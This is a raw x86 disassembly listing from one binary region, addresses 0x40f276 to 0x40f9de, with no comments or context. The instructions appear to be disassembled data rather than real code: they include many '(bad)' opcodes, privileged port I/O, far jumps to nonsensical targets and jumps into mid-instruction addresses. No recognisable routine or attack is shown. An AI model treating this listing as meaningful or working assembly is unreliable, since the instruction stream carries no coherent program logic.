  40f276:	xlat   BYTE PTR ds:[ebx]
  40f277:	push   ebp
  40f278:	push   0xffffffad
  40f27a:	xchg   ebx,eax
  40f27b:	gs or  eax,0x9bd1efb8
  40f281:	imul   ebp,DWORD PTR [eax+0x32c93b54],0x49
  40f288:	pusha  
  40f289:	in     eax,0xc
  40f28b:	sbb    DWORD PTR [ebp+0x49],esp
  40f28e:	stos   DWORD PTR es:[edi],eax
  40f28f:	imul   BYTE PTR [esi+0x255939a]
  40f295:	mov    esi,DWORD PTR [ecx+eax*2]
  40f298:	outs   dx,DWORD PTR ds:[esi]
  40f299:	mov    ds:0x751ab5c0,al
  40f29e:	pop    ecx
  40f29f:	push   0xd5006710
  40f2a4:	icebp  
  40f2a5:	test   eax,ebp
  40f2a7:	xchg   ebx,eax
  40f2a8:	je     0x40f329
  40f2aa:	push   ds
  40f2ab:	retf   
  40f2ac:	push   ebx
  40f2ad:	and    al,0x91
  40f2af:	je     0x40f2cd
  40f2b1:	jb     0x40f23d
  40f2b3:	cli    
  40f2b4:	push   edi
  40f2b5:	xor    al,0x60
  40f2b7:	push   eax
  40f2b8:	imul   edx,esp,0xffffffca
  40f2bb:	jne    0x40f28b
  40f2bd:	lea    esp,[esi-0x4af0f733]
  40f2c3:	ja     0x40f300
  40f2c5:	mov    bl,0xa8
  40f2c7:	mov    ch,0x44
  40f2c9:	cmp    eax,0x9d07c324
  40f2ce:	outs   dx,BYTE PTR ds:[esi]
  40f2cf:	cmp    eax,0x23cb5d68
  40f2d4:	js     0x40f2f4
  40f2d6:	int    0xdd
  40f2d8:	inc    edx
  40f2d9:	clc    
  40f2da:	fwait
  40f2db:	(bad)  
  40f2dc:	fistp  DWORD PTR [ebx]
  40f2de:	cwde   
  40f2df:	jb     0x40f2cc
  40f2e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2e2:	or     DWORD PTR [ebp-0x70],edi
  40f2e5:	add    dl,BYTE PTR [edx-0x1f69b709]
  40f2eb:	stc    
  40f2ec:	xlat   BYTE PTR ds:[ebx]
  40f2ed:	and    dl,BYTE PTR [ebp-0x66]
  40f2f0:	fst    QWORD PTR [eax]
  40f2f2:	xchg   esi,eax
  40f2f3:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40f2f5:	xor    al,0x7e
  40f2f7:	jge    0x40f35e
  40f2f9:	push   edi
  40f2fa:	sub    ecx,DWORD PTR [eax+ebp*2]
  40f2fd:	xchg   esp,eax
  40f2fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2ff:	cmp    BYTE PTR [ebx+0x500380e1],bl
  40f305:	out    0x44,al
  40f307:	fmul   QWORD PTR [edx]
  40f309:	push   edx
  40f30a:	pop    eax
  40f30b:	shr    DWORD PTR [esi-0x3],0x57
  40f30f:	in     al,0x74
  40f311:	imul   esi,DWORD PTR [edi-0x491ce29d],0x5416b839
  40f31b:	out    dx,eax
  40f31c:	xchg   esp,eax
  40f31d:	popa   
  40f31e:	cmp    ebx,DWORD PTR [esi*2+0x3c8fb07c]
  40f325:	pop    edi
  40f326:	loope  0x40f300
  40f328:	sbb    DWORD PTR [eax+0xd],eax
  40f32b:	daa    
  40f32c:	scas   al,BYTE PTR es:[edi]
  40f32d:	(bad)  
  40f32e:	mov    al,ds:0x2e5e18bd
  40f333:	in     al,0x39
  40f335:	pop    edi
  40f336:	mov    bh,BYTE PTR ds:0x248ea750
  40f33c:	mov    al,0x19
  40f33e:	adc    eax,0xb9acaeeb
  40f343:	in     eax,dx
  40f344:	sub    ebx,ebx
  40f346:	or     BYTE PTR [edx],bh
  40f348:	cmp    ebx,DWORD PTR [edx+0x75]
  40f34b:	sub    eax,0x5092592f
  40f350:	clc    
  40f351:	push   es
  40f352:	and    ecx,ecx
  40f354:	retf   
  40f355:	(bad)  
  40f356:	shl    BYTE PTR [ecx-0x7bd48290],1
  40f35c:	outs   dx,BYTE PTR ds:[esi]
  40f35d:	jmp    0x5141ae76
  40f362:	adc    BYTE PTR [ecx-0x3e9138f4],al
  40f368:	jbe    0x40f358
  40f36a:	push   0x2b4c9e6e
  40f36f:	pop    ebp
  40f370:	std    
  40f371:	sub    BYTE PTR [edi-0x3b087e1f],dl
  40f377:	push   ecx
  40f378:	sub    BYTE PTR [ebp+eiz*1-0x5eaeebad],ch
  40f37f:	dec    ecx
  40f380:	jg     0x40f34e
  40f382:	xchg   esi,eax
  40f383:	jno    0x40f305
  40f385:	push   es
  40f386:	inc    ebp
  40f387:	scas   eax,DWORD PTR es:[edi]
  40f388:	push   ebp
  40f389:	int3   
  40f38a:	pusha  
  40f38b:	loopne 0x40f37d
  40f38d:	mov    BYTE PTR ds:0xcecb2fd9,cl
  40f393:	in     al,0xbe
  40f395:	mov    ds:0x2c2d9a77,al
  40f39a:	jp     0x40f3f1
  40f39c:	xchg   edx,eax
  40f39d:	push   es
  40f39e:	inc    esi
  40f39f:	jae    0x40f34c
  40f3a1:	xor    edi,edx
  40f3a3:	cmp    DWORD PTR [ebp-0x57],esp
  40f3a6:	sub    DWORD PTR [ebp-0x60],eax
  40f3a9:	sub    BYTE PTR [edx],bl
  40f3ab:	mov    al,0xee
  40f3ad:	fstp   DWORD PTR [ebx]
  40f3af:	inc    edi
  40f3b0:	mov    bl,0xeb
  40f3b2:	mov    cl,BYTE PTR [eax]
  40f3b4:	inc    ecx
  40f3b5:	fbld   TBYTE PTR [ebp+0x15e846da]
  40f3bb:	pop    ebx
  40f3bc:	push   cs
  40f3bd:	popa   
  40f3be:	cmp    BYTE PTR ds:0x87e4a166,0x21
  40f3c5:	jo     0x40f3bd
  40f3c7:	sub    DWORD PTR [edx+edi*8-0x10ad1948],eax
  40f3ce:	jae    0x40f372
  40f3d0:	cmp    al,BYTE PTR [ebp-0x71c58569]
  40f3d6:	jecxz  0x40f3e4
  40f3d8:	jns    0x40f3e0
  40f3da:	je     0x40f3fa
  40f3dc:	mov    edx,0x15f7dce4
  40f3e1:	outs   dx,BYTE PTR ds:[esi]
  40f3e2:	inc    esi
  40f3e3:	pop    ebp
  40f3e4:	call   0x709242d6
  40f3e9:	push   eax
  40f3ea:	xor    eax,0x81144543
  40f3ef:	sahf   
  40f3f0:	aam    0x1e
  40f3f2:	loopne 0x40f40f
  40f3f4:	inc    ebp
  40f3f5:	jecxz  0x40f463
  40f3f7:	push   edx
  40f3f8:	pop    ebp
  40f3f9:	xchg   ebx,eax
  40f3fa:	cmp    BYTE PTR [ebx+0x408aa01d],dl
  40f400:	jg     0x40f401
  40f402:	aaa    
  40f403:	icebp  
  40f404:	jo     0x40f485
  40f406:	test   al,0xa6
  40f408:	mov    dh,0xab
  40f40a:	xchg   ecx,eax
  40f40b:	in     al,0x45
  40f40d:	mov    ds:0xc62d532,eax
  40f412:	imul   ebx,esi,0xffffff99
  40f415:	pusha  
  40f416:	popa   
  40f417:	sub    al,0x29
  40f419:	pop    ebx
  40f41a:	jp     0x40f3ca
  40f41c:	pop    esi
  40f41d:	xor    DWORD PTR [ecx],ebp
  40f41f:	ret    
  40f420:	cmp    esi,esp
  40f422:	adc    al,dh
  40f424:	mov    esi,0xe9391ab7
  40f429:	cmp    ebx,DWORD PTR [ebx+0x4c]
  40f42c:	inc    edx
  40f42d:	sub    al,0x26
  40f42f:	inc    edx
  40f430:	int    0x3a
  40f432:	push   0xffffff96
  40f434:	and    bh,BYTE PTR [esi+ebx*8]
  40f437:	jae    0x40f471
  40f439:	mov    ds:0x3781fe7a,al
  40f43e:	in     al,dx
  40f43f:	sub    esi,esp
  40f441:	xchg   ecx,eax
  40f442:	outs   dx,BYTE PTR ds:[esi]
  40f443:	mov    edi,0x65e4b062
  40f448:	and    ebx,edx
  40f44a:	mov    dh,0x61
  40f44c:	call   0xb8c:0x538e1dde
  40f453:	call   0xbe817e66
  40f458:	sub    eax,0xda8f1b64
  40f45d:	adc    al,0x68
  40f45f:	sub    ebx,DWORD PTR [edx-0x2755198e]
  40f465:	jns    0x40f4c9
  40f467:	sub    al,0xec
  40f469:	sub    al,0x17
  40f46b:	shl    DWORD PTR [edx-0x5d73fe55],cl
  40f471:	js     0x40f486
  40f473:	ja     0x40f490
  40f475:	cmp    ah,bl
  40f477:	xor    eax,0x80335184
  40f47c:	xchg   DWORD PTR [ecx],esi
  40f47e:	inc    eax
  40f47f:	ret    
  40f480:	cmc    
  40f481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f482:	retf   
  40f483:	scas   al,BYTE PTR es:[edi]
  40f484:	mov    ebp,0x14f5cbd0
  40f489:	push   ecx
  40f48a:	push   esp
  40f48b:	lods   al,BYTE PTR ds:[esi]
  40f48c:	xor    esp,edi
  40f48e:	sbb    bl,BYTE PTR [ebx]
  40f490:	call   0xf3d582f2
  40f495:	shl    DWORD PTR [ebx+ebx*4],0xe5
  40f499:	pop    ecx
  40f49a:	fist   WORD PTR [edx]
  40f49c:	sub    cl,bh
  40f49e:	jmp    0x40f453
  40f4a0:	cli    
  40f4a1:	mov    ecx,0x66af3bc5
  40f4a6:	bound  edi,QWORD PTR [ebx]
  40f4a8:	pushf  
  40f4a9:	push   esi
  40f4aa:	mov    fs,WORD PTR [ecx+0x29d60048]
  40f4b0:	inc    ebp
  40f4b1:	mov    ch,0xb3
  40f4b3:	test   al,0x95
  40f4b5:	jmp    0x40f489
  40f4b7:	retf   
  40f4b8:	push   es
  40f4b9:	cmp    esp,DWORD PTR [ebx]
  40f4bb:	jmp    0xb3b77d26
  40f4c0:	xor    eax,0x6a82b711
  40f4c5:	xor    bh,BYTE PTR [ecx-0x65e0c5ac]
  40f4cb:	sbb    eax,0x5f32f633
  40f4d0:	cmp    eax,DWORD PTR [edx-0x7e]
  40f4d3:	push   ebx
  40f4d4:	dec    ecx
  40f4d5:	add    ecx,ebx
  40f4d7:	jmp    0x1af:0x6e271ace
  40f4de:	or     ah,BYTE PTR [ecx]
  40f4e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4e1:	pop    edx
  40f4e2:	add    al,0x88
  40f4e4:	(bad)
  40f4e7:	xchg   bp,ax
  40f4e9:	xchg   esi,esp
  40f4eb:	lods   eax,DWORD PTR ds:[esi]
  40f4ec:	lea    ecx,[ebx]
  40f4ee:	fsin   
  40f4f0:	sar    bh,1
  40f4f2:	loopne 0x40f47b
  40f4f4:	ins    BYTE PTR es:[edi],dx
  40f4f5:	lds    eax,FWORD PTR [esi-0x36e7ec6a]
  40f4fb:	cld    
  40f4fc:	arpl   WORD PTR [ecx-0x73660fd3],cx
  40f502:	les    edi,FWORD PTR [esp+ecx*8]
  40f505:	cs push ecx
  40f507:	pop    edx
  40f508:	dec    esi
  40f509:	jo     0x40f4c7
  40f50b:	jmp    0x40f4fd
  40f50d:	jae    0x40f527
  40f50f:	jb     0x40f507
  40f511:	inc    eax
  40f512:	sub    al,0x1c
  40f514:	sub    DWORD PTR [ebp-0x1d],edi
  40f517:	daa    
  40f518:	mov    ds:0x6fc0a3aa,al
  40f51d:	call   0xc611:0x3786152f
  40f524:	xchg   BYTE PTR [esi+0x7d],ah
  40f527:	add    eax,0xa32cf42f
  40f52c:	jg     0x40f4f4
  40f52e:	lds    eax,FWORD PTR ds:0xe433bd8d
  40f534:	inc    ecx
  40f535:	jo     0x40f57b
  40f537:	inc    esi
  40f538:	loop   0x40f59f
  40f53a:	cmp    BYTE PTR [ebp-0x60b6312c],al
  40f540:	outs   dx,DWORD PTR ds:[esi]
  40f541:	push   cs
  40f542:	jnp    0x40f551
  40f544:	adc    ebp,DWORD PTR [ecx]
  40f546:	cmp    DWORD PTR [edi-0x4d],edi
  40f549:	std    
  40f54a:	out    0x13,al
  40f54c:	hlt    
  40f54d:	mov    ebx,0x9269df9f
  40f552:	and    DWORD PTR [edi+0x2531cbb9],eax
  40f558:	(bad)  
  40f55a:	inc    ebx
  40f55b:	xchg   esp,eax
  40f55c:	sub    eax,0x7fe06c42
  40f561:	jmp    0x40f5d9
  40f563:	jne    0x40f562
  40f565:	mov    bh,0x74
  40f567:	fisubr DWORD PTR [edi-0x55]
  40f56a:	jle    0x40f538
  40f56c:	mov    ecx,DWORD PTR [edi+0x225baa25]
  40f572:	loop   0x40f5ec
  40f574:	imul   esi,DWORD PTR [esi-0x95fe71a],0xb543df0f
  40f57e:	xchg   ecx,eax
  40f57f:	xchg   ebx,eax
  40f580:	icebp  
  40f581:	pop    ebx
  40f582:	les    esp,FWORD PTR [esi+0x79]
  40f585:	in     eax,dx
  40f586:	shl    DWORD PTR [edx+0x62],0xa4
  40f58a:	mov    dl,0x46
  40f58c:	dec    dl
  40f58e:	fnstenv [eax]
  40f590:	repnz cmp DWORD PTR [eax],ebp
  40f593:	lahf   
  40f594:	in     al,0xd5
  40f596:	in     al,0x50
  40f598:	inc    ebx
  40f599:	(bad)  
  40f59a:	in     eax,dx
  40f59b:	popa   
  40f59c:	jmp    0x8929:0xe3030039
  40f5a3:	add    al,0x26
  40f5a5:	lds    ebp,FWORD PTR [edx+0x16]
  40f5a8:	and    al,0x48
  40f5aa:	cdq    
  40f5ab:	in     al,dx
  40f5ac:	pop    ds
  40f5ad:	test   DWORD PTR [edx-0x495b06f5],edi
  40f5b3:	aam    0xe3
  40f5b5:	icebp  
  40f5b6:	int    0xd7
  40f5b8:	mov    edi,0xf396867f
  40f5bd:	iret   
  40f5be:	jl     0x40f56f
  40f5c0:	adc    bh,BYTE PTR [ebx]
  40f5c2:	add    DWORD PTR [esi],esp
  40f5c4:	cmp    edx,edi
  40f5c6:	or     ebx,0xd2317541
  40f5cc:	repnz mov dl,0xca
  40f5cf:	call   DWORD PTR [edi+0x3d]
  40f5d2:	and    DWORD PTR [ecx+0x6616d0a5],edi
  40f5d8:	and    al,0xb4
  40f5da:	(bad)  
  40f5dc:	(bad)  
  40f5dd:	push   0x3d
  40f5df:	int    0x96
  40f5e1:	fdivr  DWORD PTR ds:0x6b34ed33
  40f5e7:	xchg   edi,eax
  40f5e8:	and    al,0xd9
  40f5ea:	ret    
  40f5eb:	cmc    
  40f5ec:	add    al,0x33
  40f5ee:	pop    ebp
  40f5ef:	leave  
  40f5f0:	jo     0x40f580
  40f5f2:	lea    ecx,[ecx+ecx*4+0x5a]
  40f5f6:	in     eax,dx
  40f5f7:	add    eax,0x33cbea4f
  40f5fc:	(bad)  
  40f5fd:	int    0xa
  40f5ff:	push   esi
  40f600:	dec    ebx
  40f601:	nop
  40f602:	addr16 popa 
  40f604:	pop    es
  40f605:	daa    
  40f606:	addr16 mov ch,0xa1
  40f609:	cs popa 
  40f60b:	and    al,0xc6
  40f60d:	sub    BYTE PTR [ecx+0x383c247f],ch
  40f613:	stos   BYTE PTR es:[edi],al
  40f614:	je     0x40f5c3
  40f616:	retf   
  40f617:	push   esi
  40f618:	jno    0x40f59e
  40f61a:	pop    edi
  40f61b:	inc    ebp
  40f61c:	jns    0x40f66f
  40f61e:	adc    ebx,esp
  40f620:	fild   DWORD PTR [edx]
  40f622:	div    DWORD PTR [ebp-0x41]
  40f625:	push   cs
  40f626:	mov    esp,0xf98244e
  40f62b:	dec    ebx
  40f62c:	sbb    eax,0xe212c885
  40f631:	dec    eax
  40f632:	repz iret 
  40f634:	lea    edi,[ecx+0x8]
  40f637:	mov    cl,0x7d
  40f639:	out    0xea,al
  40f63b:	popf   
  40f63c:	inc    esi
  40f63d:	cmc    
  40f63e:	leave  
  40f63f:	mov    edx,0x30908e57
  40f644:	into   
  40f645:	int    0xef
  40f647:	icebp  
  40f648:	ja     0x40f6a4
  40f64a:	fdivr  st,st(5)
  40f64c:	mov    ebx,DWORD PTR [edi+ebx*2-0x39c30d55]
  40f653:	cmp    DWORD PTR [ebp+0x477da29b],esi
  40f659:	pushf  
  40f65a:	stc    
  40f65b:	loopne 0x40f66f
  40f65d:	dec    ebx
  40f65e:	ss jmp 0x40f6a2
  40f661:	in     al,dx
  40f662:	pusha  
  40f663:	std    
  40f664:	std    
  40f665:	xor    DWORD PTR ds:0x72c94b22,ebp
  40f66b:	jl     0x40f696
  40f66d:	mov    bl,0x3a
  40f66f:	fwait
  40f670:	scas   al,BYTE PTR es:[edi]
  40f671:	ror    DWORD PTR [edi+0x1d790893],cl
  40f677:	(bad)  
  40f678:	cmc    
  40f679:	cmp    eax,0xdc3347a3
  40f67e:	in     al,0xb8
  40f680:	push   ebx
  40f681:	xchg   ecx,eax
  40f682:	add    bh,BYTE PTR [ebx+eax*4]
  40f685:	in     al,dx
  40f686:	mov    dh,0xe6
  40f688:	std    
  40f689:	icebp  
  40f68a:	and    eax,0x8f86722a
  40f68f:	inc    ebx
  40f690:	inc    esp
  40f691:	and    eax,0xedd46546
  40f696:	lahf   
  40f697:	dec    edx
  40f698:	inc    bp
  40f69a:	(bad)  
  40f69b:	mov    es,WORD PTR [eax+edi*4]
  40f69e:	popa   
  40f69f:	shl    DWORD PTR [esi+0x5aea6b0b],1
  40f6a5:	add    eax,0x7c641b9d
  40f6aa:	cmp    eax,0x7659d2ba
  40f6af:	ss enter 0x8668,0x1d
  40f6b4:	frstor [edi+0x25]
  40f6b7:	fs and eax,0xc4963f27
  40f6bd:	mov    eax,0x4bc66f5
  40f6c2:	cmp    DWORD PTR [esi+0x3733a327],eax
  40f6c8:	xor    eax,0x97d0413b
  40f6cd:	iret   
  40f6ce:	sub    eax,0x86f36e82
  40f6d3:	push   eax
  40f6d4:	dec    esi
  40f6d5:	scas   al,BYTE PTR es:[edi]
  40f6d6:	push   ebx
  40f6d7:	jge    0x40f71a
  40f6d9:	and    DWORD PTR [si-0x1685],0x58
  40f6df:	jg     0x40f6c1
  40f6e1:	scas   eax,DWORD PTR es:[di]
  40f6e3:	js     0x40f6f0
  40f6e5:	xor    eax,DWORD PTR [esi+eiz*1-0x38]
  40f6e9:	cmc    
  40f6ea:	mov    dl,0x9f
  40f6ec:	in     eax,dx
  40f6ed:	push   esp
  40f6ee:	sar    ah,cl
  40f6f0:	ret    0xb34f
  40f6f3:	adc    BYTE PTR [ebp+0x1cda3a7c],bl
  40f6f9:	lahf   
  40f6fa:	and    al,BYTE PTR [edx-0x55]
  40f6fd:	inc    esp
  40f6fe:	call   0xeba42757
  40f703:	inc    ebx
  40f704:	bound  ebx,QWORD PTR [edx-0x60]
  40f707:	inc    ebx
  40f708:	xor    DWORD PTR [ecx-0x2c],ecx
  40f70b:	popa   
  40f70c:	(bad)  [ebp+eax*8-0x70814c36]
  40f713:	test   BYTE PTR [si+0x22],dl
  40f717:	cmp    al,0x29
  40f719:	mov    esi,0x48d40968
  40f71e:	push   ss
  40f71f:	das    
  40f720:	xchg   ecx,eax
  40f721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f722:	mov    ch,0xb8
  40f724:	call   0x358a:0xdd5225ff
  40f72b:	inc    ebp
  40f72c:	inc    esp
  40f72d:	outs   dx,DWORD PTR ds:[esi]
  40f72e:	gs dec esp
  40f730:	in     al,dx
  40f731:	sbb    eax,0x9553c497
  40f736:	or     ah,BYTE PTR [ecx+0x33e1d3d0]
  40f73c:	dec    eax
  40f73d:	push   edx
  40f73e:	pop    edx
  40f73f:	fsubr  QWORD PTR [edi-0x6496b1e8]
  40f745:	ja     0x40f7c2
  40f747:	mov    al,ah
  40f749:	jnp    0x40f755
  40f74b:	adc    BYTE PTR [ebp+0xf],ch
  40f74e:	arpl   WORD PTR ds:0x78f50f35,ax
  40f754:	add    BYTE PTR ds:0x6234f342,dl
  40f75a:	test   eax,edi
  40f75c:	sbb    bh,bl
  40f75e:	dec    esp
  40f75f:	enter  0xdfb3,0xed
  40f763:	neg    DWORD PTR [edi]
  40f765:	sbb    dh,BYTE PTR [edx]
  40f767:	jg     0x40f787
  40f769:	or     bl,ah
  40f76b:	mov    edi,esi
  40f76d:	jo     0x40f78e
  40f76f:	cdq    
  40f770:	jmp    FWORD PTR [ebp-0x43e8bc3a]
  40f776:	lock dec edi
  40f778:	inc    eax
  40f779:	sahf   
  40f77a:	jmp    0x5ae04fe1
  40f77f:	push   ebp
  40f780:	jns    0x40f726
  40f782:	not    DWORD PTR [edi-0x3db11f29]
  40f788:	(bad)
  40f78b:	push   0x58815c4f
  40f790:	adc    ch,BYTE PTR [ecx]
  40f792:	and    DWORD PTR [eax+0x76bf3e59],ebx
  40f798:	mov    ecx,0x96aab188
  40f79d:	inc    edi
  40f79e:	sub    eax,ecx
  40f7a0:	stos   BYTE PTR es:[edi],al
  40f7a1:	jb     0x40f81e
  40f7a3:	xor    BYTE PTR [edx+0x7aad9011],0xf3
  40f7aa:	sub    edx,edi
  40f7ac:	xchg   ebx,eax
  40f7ad:	in     al,dx
  40f7ae:	fcomip st,st(1)
  40f7b0:	ret    
  40f7b1:	mov    dh,0xd4
  40f7b3:	mov    cl,0x8f
  40f7b5:	sub    al,BYTE PTR [esi+0x27]
  40f7b8:	jmp    0x40f74e
  40f7ba:	repnz jecxz 0x40f822
  40f7bd:	and    al,0x82
  40f7bf:	push   0x6e9bfdc5
  40f7c4:	sti    
  40f7c5:	xchg   esi,esi
  40f7c7:	mov    ebp,0x7eb684bb
  40f7cc:	or     al,0x96
  40f7ce:	add    BYTE PTR [eax+0x40],dh
  40f7d1:	dec    ebp
  40f7d2:	add    al,BYTE PTR [ebx-0x6950c2d9]
  40f7d8:	jmp    0xde1c:0x2e532221
  40f7df:	retf   0xe6e9
  40f7e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7e3:	loop   0x40f80a
  40f7e5:	add    cl,cl
  40f7e7:	lock sub al,0x44
  40f7ea:	enter  0x14a6,0x35
  40f7ee:	ins    BYTE PTR es:[edi],dx
  40f7ef:	das    
  40f7f0:	mov    eax,0x1aa100e3
  40f7f5:	push   ss
  40f7f6:	gs stos BYTE PTR es:[edi],al
  40f7f8:	xchg   ecx,eax
  40f7f9:	aam    0xdd
  40f7fb:	cli    
  40f7fc:	clc    
  40f7fd:	sbb    BYTE PTR [ecx+esi*4+0x80d8c0],0xdc
  40f805:	mov    ds:0xbcf0ae,al
  40f80a:	jae    0x40f879
  40f80c:	jge    0x40f7af
  40f80e:	push   es
  40f80f:	push   cs
  40f810:	push   esi
  40f811:	jb     0x40f7e5
  40f813:	and    bl,BYTE PTR [esi]
  40f815:	mov    ecx,0x49544378
  40f81a:	arpl   WORD PTR [ebp+ecx*8+0x3],ax
  40f81e:	sbb    eax,0x6181accb
  40f823:	out    0x7e,eax
  40f825:	xlat   BYTE PTR ds:[ebx]
  40f826:	ja     0x40f835
  40f828:	fiadd  DWORD PTR [esi+0x4cd7da27]
  40f82e:	pop    ss
  40f82f:	pop    ebp
  40f830:	fsubr  QWORD PTR [esi+edx*4+0x1a]
  40f834:	xlat   BYTE PTR ds:[ebx]
  40f835:	mov    al,ds:0xfebe97d9
  40f83a:	adc    al,0xa1
  40f83c:	pop    ebx
  40f83d:	mov    ss,WORD PTR [eax+eax*1+0x9]
  40f841:	out    dx,eax
  40f842:	inc    eax
  40f843:	cmp    ebx,ebp
  40f845:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f846:	jmp    0x3dcd:0x65b0f0c4
  40f84d:	pop    esp
  40f84e:	jge    0x40f898
  40f850:	mov    ch,0xba
  40f852:	xchg   DWORD PTR [ecx],edi
  40f854:	rcr    DWORD PTR [edi],cl
  40f856:	mov    BYTE PTR [ebx],bl
  40f858:	jns    0x40f864
  40f85a:	inc    edx
  40f85b:	mov    ds:0xbb19f668,eax
  40f860:	jecxz  0x40f82c
  40f862:	mov    ebp,0x4cf7bda7
  40f867:	leave  
  40f868:	xor    eax,0xb96a672d
  40f86d:	cdq    
  40f86e:	arpl   WORD PTR [ebp-0x6d2c5759],dx
  40f874:	push   0x9bda4b0a
  40f879:	outs   dx,DWORD PTR ds:[esi]
  40f87a:	cmp    BYTE PTR [eax-0x5d],0x19
  40f87e:	rcl    BYTE PTR ds:0x18a99fcb,0x79
  40f885:	and    bh,ah
  40f887:	jne    0x40f870
  40f889:	(bad)  
  40f88a:	test   al,0xe5
  40f88c:	mov    ?,WORD PTR [edx-0x1863438f]
  40f892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f893:	pop    ds
  40f894:	inc    esp
  40f895:	cmp    al,0x79
  40f897:	jnp    0x40f900
  40f899:	sub    BYTE PTR [ecx+0x5fe61bb1],cl
  40f89f:	dec    ebx
  40f8a0:	nop
  40f8a1:	mov    esp,ebp
  40f8a3:	inc    esp
  40f8a4:	mov    ah,BYTE PTR [edi-0x25]
  40f8a7:	int3   
  40f8a8:	(bad)  
  40f8aa:	pusha  
  40f8ab:	and    al,0xc4
  40f8ad:	fistp  QWORD PTR ds:0x2d07cc28
  40f8b3:	or     BYTE PTR [edx+0x46],dl
  40f8b6:	test   eax,0xabe627b6
  40f8bb:	and    edi,DWORD PTR [esi]
  40f8bd:	push   esi
  40f8be:	call   FWORD PTR [edx]
  40f8c0:	xor    eax,0x67c25b37
  40f8c5:	xchg   ebp,esp
  40f8c7:	sbb    DWORD PTR [ebx+0x42],ebp
  40f8ca:	inc    ecx
  40f8cb:	dec    bl
  40f8cd:	sbb    eax,0xfc2394dd
  40f8d2:	cmp    bl,BYTE PTR [eax+0x6a]
  40f8d5:	xchg   edx,eax
  40f8d6:	std    
  40f8d7:	aad    0x88
  40f8d9:	(bad)  
  40f8da:	dec    ecx
  40f8db:	cs cwde 
  40f8dd:	or     al,0xc7
  40f8df:	rcr    DWORD PTR [ebx+0x40e94258],1
  40f8e5:	xchg   esp,eax
  40f8e6:	push   0x62
  40f8e8:	retf   
  40f8e9:	push   es
  40f8ea:	ds loop 0x40f909
  40f8ed:	je     0x40f966
  40f8ef:	movlps QWORD PTR ds:[ecx+0x27],xmm6
  40f8f4:	dec    edi
  40f8f5:	cwde   
  40f8f6:	pop    ss
  40f8f7:	imul   ah
  40f8f9:	int    0x6f
  40f8fb:	outs   dx,BYTE PTR ds:[esi]
  40f8fc:	mov    BYTE PTR [edx+0x62],al
  40f8ff:	pop    edx
  40f900:	xchg   ebx,eax
  40f901:	jmp    0xc7235363
  40f906:	ds ins BYTE PTR es:[edi],dx
  40f908:	add    DWORD PTR [ebx+0x2e],ebx
  40f90b:	pop    esp
  40f90c:	(bad)  
  40f90d:	ins    BYTE PTR es:[edi],dx
  40f90e:	jo     0x40f92c
  40f910:	int3   
  40f911:	xchg   edi,eax
  40f912:	lahf   
  40f913:	rcl    BYTE PTR [edi+0x6a],1
  40f916:	push   0xffffff82
  40f918:	clc    
  40f919:	xchg   esp,eax
  40f91a:	jmp    0x40f8a0
  40f91c:	pop    esp
  40f91d:	ror    DWORD PTR [eax+eax*4],0x0
  40f921:	in     al,dx
  40f922:	arpl   WORD PTR es:[ecx],dx
  40f925:	xor    esp,ebp
  40f927:	pop    ebp
  40f928:	out    0x1f,eax
  40f92a:	mov    eax,0x64389fbe
  40f92f:	pop    eax
  40f930:	out    dx,eax
  40f931:	ins    BYTE PTR es:[edi],dx
  40f932:	lods   eax,DWORD PTR ds:[esi]
  40f933:	(bad)  
  40f934:	jb     0x40f914
  40f936:	mov    ebx,0xf441a2c5
  40f93b:	mov    al,ds:0xccf75347
  40f940:	je     0x40f99a
  40f942:	jno    0x40f962
  40f944:	mov    al,ds:0xfd6e78b4
  40f949:	loopne 0x40f950
  40f94b:	(bad)  
  40f94c:	push   ebp
  40f94d:	in     eax,dx
  40f94e:	mov    al,ds:0x26529791
  40f953:	jns    0x40f98d
  40f955:	or     al,0x49
  40f957:	jge    0x40f97a
  40f959:	sar    BYTE PTR [edx+0x5bce828],1
  40f95f:	dec    ebp
  40f960:	sbb    bl,BYTE PTR [eax-0xe]
  40f963:	fwait
  40f964:	dec    esi
  40f965:	out    0xfe,eax
  40f967:	pop    ebp
  40f968:	or     ebp,ebx
  40f96a:	(bad)  
  40f96b:	mov    al,0x7f
  40f96d:	xchg   esp,eax
  40f96e:	ds mov dl,0xe3
  40f971:	fsub   QWORD PTR [esi]
  40f973:	fwait
  40f974:	(bad)  
  40f975:	rcr    BYTE PTR [edi],0x9c
  40f978:	(bad)
  40f97c:	push   0xffffffa7
  40f97e:	enter  0xcbcd,0xcf
  40f982:	dec    edi
  40f983:	(bad)  
  40f984:	jecxz  0x40f96c
  40f986:	mov    edi,DWORD PTR [eax]
  40f988:	sbb    al,0xa6
  40f98a:	shl    BYTE PTR [esi-0x6a],1
  40f98d:	mov    dh,0x26
  40f98f:	fbld   TBYTE PTR [esi]
  40f991:	adc    ah,BYTE PTR [ecx]
  40f993:	jp     0x40f948
  40f995:	push   ebp
  40f996:	and    al,0x6b
  40f998:	je     0x40f927
  40f99a:	cmp    al,0x12
  40f99c:	lods   al,BYTE PTR gs:[esi]
  40f99e:	jmp    0x40f92e
  40f9a0:	mov    cl,0xa0
  40f9a2:	xchg   ebp,eax
  40f9a3:	dec    DWORD PTR [edx+0x28]
  40f9a6:	in     eax,dx
  40f9a7:	das    
  40f9a8:	mov    esi,0xb44c325b
  40f9ad:	int    0x10
  40f9af:	add    eax,0x3f92e26d
  40f9b4:	bound  ecx,QWORD PTR [ebp-0x79567356]
  40f9ba:	sbb    eax,0x39fd5232
  40f9bf:	lds    ebx,FWORD PTR [ecx]
  40f9c1:	sub    eax,0x85ad879
  40f9c6:	icebp  
  40f9c7:	repz sti 
  40f9c9:	mov    ebp,0xfa3d8846
  40f9ce:	sub    al,0xcc
  40f9d0:	sbb    BYTE PTR [eax-0x7c],ah
  40f9d3:	xchg   ebp,eax
  40f9d4:	xor    edx,DWORD PTR [ecx]
  40f9d6:	sbb    bh,BYTE PTR [ecx]
  40f9d8:	mov    edi,0xa3460aff
  40f9dd:	stos   DWORD PTR es:[edi],eax
  40f9de:	(bad)  
